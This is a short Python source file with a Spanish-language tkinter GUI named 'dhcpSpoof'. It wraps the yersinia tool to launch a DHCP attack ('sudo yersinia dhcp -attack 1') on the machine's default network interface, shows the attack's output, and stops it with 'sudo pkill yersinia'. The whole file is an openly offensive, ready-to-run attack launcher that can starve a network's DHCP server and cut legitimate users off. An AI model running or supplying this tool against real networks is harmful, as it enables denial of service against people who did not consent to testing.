import tkinter as tk
import subprocess
import os
import threading

# Variable global para el proceso de Yersinia
yersinia_process = None

def actualizar_salida():
    if yersinia_process:
        for linea in iter(yersinia_process.stdout.readline, b""):
            salida_text.insert(tk.END, linea.decode("utf-8"))
            salida_text.see(tk.END)

def iniciar_ataque():
    global yersinia_process
    
    if yersinia_process is None:
        interfaz = obtener_interfaz()
        if interfaz:
            comando = f"sudo yersinia dhcp -attack 1 -interface {interfaz}"
            yersinia_process = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            estado_label.config(text="Ataque en curso...", fg="red")
            threading.Thread(target=actualizar_salida, daemon=True).start()
        else:
            estado_label.config(text="No se detectó interfaz activa", fg="black")
    else:
        estado_label.config(text="El ataque ya está en ejecución", fg="black")

def detener_ataque():
    global yersinia_process
    
    if yersinia_process:
        os.system("sudo pkill yersinia")
        yersinia_process = None
        estado_label.config(text="Ataque detenido", fg="green")
    else:
        estado_label.config(text="No hay ataque en ejecución", fg="black")

def obtener_interfaz():
    try:
        resultado = subprocess.check_output("ip route | grep default | awk '{print $5}'", shell=True, text=True).strip()
        return resultado if resultado else None
    except subprocess.CalledProcessError:
        return None

# Crear la ventana principal
root = tk.Tk()
root.title("dhcpSpoof")
root.geometry("400x300")

# Etiqueta de estado
estado_label = tk.Label(root, text="Estado: Inactivo", font=("Arial", 12))
estado_label.pack(pady=10)

# Botón para iniciar el ataque
btn_iniciar = tk.Button(root, text="Iniciar Ataque", font=("Arial", 12), bg="red", fg="white", command=iniciar_ataque)
btn_iniciar.pack(pady=5)

# Botón para detener el ataque
btn_detener = tk.Button(root, text="Detener Ataque", font=("Arial", 12), bg="green", fg="white", command=detener_ataque)
btn_detener.pack(pady=5)

# Área de texto para la salida del ataque
salida_text = tk.Text(root, height=8, width=50)
salida_text.pack(pady=10)

# Ejecutar la GUI
root.mainloop()